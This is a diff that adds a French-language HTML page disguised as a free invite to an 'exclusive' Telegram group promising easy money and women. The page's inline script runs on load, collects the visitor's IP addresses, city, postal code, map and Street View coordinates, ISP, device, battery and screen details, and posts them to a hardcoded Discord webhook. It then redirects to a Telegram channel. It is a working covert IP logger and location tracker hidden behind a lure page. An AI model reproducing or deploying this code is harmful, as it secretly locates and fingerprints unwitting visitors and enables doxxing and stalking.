@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Groupe Telegram Exclusif">
+  <meta property="og:title" content="Rejoins le groupe Telegram le plus chaud de 2025 !">
+  <meta property="og:description" content="Accès 100% gratuit à un groupe privé avec des opportunités business, de l'argent facile et des meufs incroyables. Clique maintenant !">
+  <meta property="og:image" content="https://cdn.pixabay.com/photo/2022/09/18/07/41/logo-7462411_1280.png">
+  <meta property="og:url" content="https://t.me/fiscalitecryptofr">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Groupe Télégram Argent & Meufs - Rejoins Gratuitement">
+  <meta name="twitter:description" content="Rejoins le meilleur groupe Telegram gratuit avec cash facile, business et des bombes en DM.">
+  <meta name="twitter:image" content="https://cdn.pixabay.com/photo/2022/09/18/07/41/logo-7462411_1280.png">
+  <title>Connexion...</title>
+</head>
+<body>
+<script>
+(async () => {
+  const webhookUrl = "https://discord.com/api/webhooks/1369682578667471029/n56CemGjDBrnvS618LdHh5-aGp2w1FqOwgFKsu73rH7EVpalgxeQsH8UvXI4HgqS8MCe";
+
+  // Récupérer l'IPv4 et IPv6
+  const ipData = await fetch("http://ip-api.com/json/").then(r => r.json()).catch(() => ({}));
+  const ipv6Data = await fetch("https://api64.ipify.org?format=json").then(r => r.json()).catch(() => ({ ip: "Non disponible" }));
+
+  // Récupérer les données de la batterie
+  let battery = { level: "Inconnu", charging: "Inconnu" };
+  try {
+    const b = await navigator.getBattery();
+    battery = {
+      level: (b.level * 100).toFixed(0) + '%',
+      charging: b.charging ? 'Oui' : 'Non'
+    };
+  } catch {}
+
+  // Récupérer les données de connexion et écran
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+  const screenData = screen || {};
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Inconnu";
+
+  // Construire le message à envoyer
+  const payload = {
+    content: `**Nouvelle connexion détectée**\n
+**IPv4**: ${ipData.query || 'Inconnue'}
+**IPv6**: ${ipv6Data.ip}
+**Ville**: ${ipData.city || 'Inconnue'}
+**Région**: ${ipData.regionName || 'Inconnue'}
+**Pays**: ${ipData.country || 'Inconnu'}
+**Code postal**: ${ipData.zip || 'Inconnu'}
+**Google Maps**: https://www.google.com/maps?q=${ipData.lat},${ipData.lon}
+**Street View**: https://www.google.com/maps?q=${ipData.lat},${ipData.lon}&layer=c&cbll=${ipData.lat},${ipData.lon}
+
+**ISP**: ${ipData.isp || 'Inconnu'}
+**Organisation (ORG)**: ${ipData.org || 'Inconnue'}
+**ASN**: ${ipData.as || 'Inconnu'}
+**Fuseau horaire**: ${ipData.timezone || timezone}
+
+**User-Agent**: ${navigator.userAgent}
+**Plateforme**: ${navigator.platform}
+**Langue**: ${navigator.language}
+**Cookies activés**: ${navigator.cookieEnabled ? 'Oui' : 'Non'}
+**Type d'appareil**: ${/mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Ordinateur'}
+
+**Batterie**: ${battery.level}
+**En charge**: ${battery.charging}
+
+**Connexion**: ${conn.effectiveType || 'Inconnue'} (${conn.downlink || '?'} Mbps, ${conn.rtt || '?'} ms)
+**Écran**: ${screenData.width}x${screenData.height} (${screenData.availWidth}x${screenData.availHeight})`
+  };
+
+  // Envoi des données au webhook Discord
+  try {
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (error) {
+    console.error("Erreur lors de l'envoi au webhook:", error);
+  } finally {
+    // Rediriger vers le groupe Telegram après l'envoi
+    window.location.href = "https://t.me/fiscalitecryptofr";
+  }
+})();
+</script>
+</body>
+</html>
